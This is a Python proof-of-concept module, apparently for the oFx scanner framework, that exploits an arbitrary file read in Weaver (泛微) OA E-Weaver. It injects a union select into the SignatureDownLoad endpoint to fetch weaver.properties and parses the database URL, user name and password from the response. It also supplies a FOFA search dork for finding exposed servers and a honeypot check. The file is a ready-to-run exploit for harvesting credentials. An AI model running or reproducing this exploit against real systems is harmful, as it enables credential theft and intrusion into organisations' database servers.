# coding:utf-8  
import requests
from lib.core.common import url_handle, get_random_ua, gen_title
from lib.core.poc import POCBase
# ...
import urllib3

urllib3.disable_warnings()


class POC(POCBase):
    _info = {
        "author": "jijue",  # POC作者
        "version": "1",  # POC版本，默认是1
        "CreateDate": "2022-01-01",  # POC创建时间
        "UpdateDate": "2022-01-01",  # POC创建时间
        "PocDesc": """
        略  
        """,  # POC描述，写更新描述，没有就不写

        "name": "泛微OA E-Weaver SignatureDownLoad 任意文件读取漏洞",  # 漏洞名称
        "VulnID": "oFx-2022-0001",  # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
        "AppName": "泛微OA E-Weaver",  # 漏洞应用名称
        "AppVersion": "",  # 漏洞应用版本
        "VulnDate": "2022-01-01",  # 漏洞公开的时间,不知道就写今天，格式：xxxx-xx-xx
        "VulnDesc": """
            泛微协同管理平台e-weaver继承e-cology八大功能模块应用，并可进一步打通企业更深层的个性管理需求，基于协同思想打造全面整合企业管理资源的环境。
            e-weaver基于工作流引擎＋卡片/表单＋组件模式，全面开放已有八大功能的配置应用，同时还可以根据用户个性的管理需求，增添企业独立的应用模块功能，从而形成完全符合自身企业的全面协同管理应用解决方案。
            泛微OA e-weaver平台SignatureDownLoad处存在敏感信息泄露漏洞，攻击者通过漏洞可以获取数据库服务器权限。
        """,  # 漏洞简要描述

        "fofa-dork": """
            app="泛微-E-Weaver
        """,  # fofa搜索语句
        "example": "",  # 存在漏洞的演示url，写一个就可以了
        "exp_img": "",  # 先不管
    }

    def _verify(self):
        """
        返回vuln

        存在漏洞：vuln = [True,html_source] # html_source就是页面源码  

        不存在漏洞：vuln = [False,""]
        """
        vuln = [False, ""]
        url = self.target + "/weaver/weaver.file.SignatureDownLoad?markId=0%20union%20select%20%27../ecology/WEB-INF/prop/weaver.properties%27"  # url自己按需调整

        headers = {
            "User-Agent": get_random_ua(),
            "Connection": "close",
            # "Content-Type": "application/x-www-form-urlencoded",
        }

        try:
            """
            检测逻辑，漏洞存在则修改vuln值为True，漏洞不存在则不动
            """
            req = requests.get(url, headers=headers, proxies=self.proxy, timeout=self.timeout, verify=False)
            if "ecology.user" in req.text and "application/octet-stream" in req.headers[
                "Content-Type"] and "DriverClasses =" in req.text:
                con = req.text.split("\r\n\r\n")[1].split("\r\n")
                dburl = con[0]
                dbuser = con[1]
                dbpasswd = con[2]
                vuln = [True, gen_title(dburl + " | " + dbuser + " | " + dbpasswd)]
            else:
                vuln = [False, req.text]
        except Exception as e:
            raise e

        # 以下逻辑酌情使用
        if self._honeypot_check(vuln[1]) == True:
            vuln[0] = False

        return vuln

    def _attack(self):
        return self._verify()
